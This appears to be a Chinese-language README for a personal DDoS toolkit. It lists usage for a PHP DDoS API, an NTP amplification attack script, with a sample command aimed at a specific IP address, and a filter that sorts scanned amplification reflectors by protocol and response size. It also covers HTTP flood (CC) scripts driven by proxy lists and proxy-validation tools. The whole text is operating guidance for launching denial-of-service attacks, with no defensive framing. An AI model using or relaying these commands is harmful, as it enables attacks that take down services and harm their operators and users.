# 自用cc脚本

DDoS API - PHP

支持 秘钥 / 自定义方法

需要安装 PHP-SSH2 扩展

http://127.0.0.1/api.php?key=秘钥&host=IP地址&port=端口&time=时间&method=方法


	
DDoS Concurrent API - PHP PLUS

支持 秘钥 / 自定义方法 / 并发 / 自定义命令

需要安装 PHP-SSH2 扩展

http://127.0.0.1/api.php?key=秘钥&host=IP地址&port=端口&time=时间&method=方法&max=并发


	
NTP注入器

已去除 "请勿泄露" 字符

./ntpfill ntp.txt 4000

./ntpfill 列表文件 注入次数



NTP攻击脚本 (汉化)

./ntp <目标IP> <端口> <列表文件> <线程> <pps限制器|默认-1> <时间(秒)>

示例：./ntp 117.27.239.1 80 cnntp.txt 100 -1 60



EasyFilter(简易过滤) 1.0

完全汉化，已删除后门

格式

./filter <输入> <输出> <协议> <最小字节> <输出格式>

示例

./filter ntpscan.txt ntp.txt ntp 400 [ip]

./filter ssdpscan.txt ssdp.txt ssdp 200 [ip][space][bytes]

支持协议

chargen, ntp, quake, ssdp, ldap, dns, snmp, mdns, tftp, portmap, netbios

输出格式变量

[space], [ip], [bytes]



『CC+』

基于 cc.js 的美化版CC脚本

SH

./cc+.sh 线程 列表文件 方法 时间(秒) 目标(URL)

格式

node cc+.js 列表文件 方法 时间(秒) 目标(URL)

示例

node cc+.js proxy.txt GET 60 http://example.com



『CC+PLUS+』

格式

./cc+.sh 线程 列表文件 方法 速率 时间(秒) 目标(URL) 随机参数[开:t/关:f]

示例

./cc+.sh 100 proxy.txt GET 10 60 http://example.com t



『CheckChinaProxyIP』1.4

验证中国代理IP Golang 脚本

示例

./ccpip proxy.txt cn.txt 1000 5

格式

./ccpip 输入 输出 协程(线程) 超时(秒)

运行脚本前，请先执行命令

ulimit -n 999999



『ProxyFiltering』3.3

公益版 HTTP/HTTPS 代理过滤脚本

协议

http https

示例

./pf http 15 1000 origin.txt proxy.txt

格式

./pf 检测协议 超时(秒) 线程 输入 输出 [可选:检测地址(返回请求IP)]

执行脚本前，请输入此命令解除系统限制

ulimit -n 999999

更新日志

- pfbot的改版

- 增加验证节点 (验证更准确)


